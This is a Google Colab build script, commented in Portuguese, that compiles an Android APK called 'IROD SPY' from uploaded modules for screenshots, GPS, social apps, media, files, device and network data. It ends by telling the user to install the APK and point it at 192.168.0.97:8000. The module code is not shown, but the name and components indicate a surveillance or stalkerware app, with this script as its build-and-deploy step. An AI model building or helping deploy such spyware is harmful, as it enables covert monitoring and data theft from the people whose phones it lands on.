# IROD SPY - BUILD APK GOOGLE COLAB
# Copie este código completo para o Google Colab

# PASSO 1: Configurar ambiente
print("🔧 Configurando ambiente...")
!apt update -qq
!apt install -y openjdk-8-jdk wget unzip git
import os
os.environ['JAVA_HOME'] = '/usr/lib/jvm/java-8-openjdk-amd64'
!pip install -q buildozer cython kivy kivymd plyer requests pillow
print("✅ Ambiente configurado!")

# PASSO 2: Upload dos arquivos
print("\n📁 Faça upload dos arquivos:")
print("- main.py")
print("- buildozer-social.spec") 
print("- screenshot_utils.py")
print("- social_utils.py")
print("- apps_utils.py")
print("- gps_utils.py")
print("- media_utils.py")
print("- network_utils.py")
print("- device_utils.py")
print("- file_utils.py")

from google.colab import files
uploaded = files.upload()
print(f"✅ {len(uploaded)} arquivos enviados!")

# PASSO 3: Verificar arquivos
print("\n🔍 Verificando arquivos...")
required = ['main.py', 'buildozer-social.spec']
for file in required:
    if os.path.exists(file):
        print(f"✅ {file}")
    else:
        print(f"❌ {file} - FALTANDO!")

# PASSO 4: Build APK
print("\n🚀 Gerando APK (15-30 min)...")
!rm -rf .buildozer bin
!buildozer android debug --spec buildozer-social.spec

# PASSO 5: Download APK
print("\n📱 Baixando APK...")
import glob
apk_files = glob.glob("bin/*.apk")
if apk_files:
    print("🎉 APK GERADO!")
    for apk in apk_files:
        size = os.path.getsize(apk) / (1024*1024)
        print(f"📱 {apk} ({size:.1f} MB)")
        files.download(apk)
    print("\n✅ SUCESSO! APK baixado para seu computador")
    print("📋 Instale no Android e configure IP: 192.168.0.97:8000")
else:
    print("❌ Erro no build - verifique logs acima")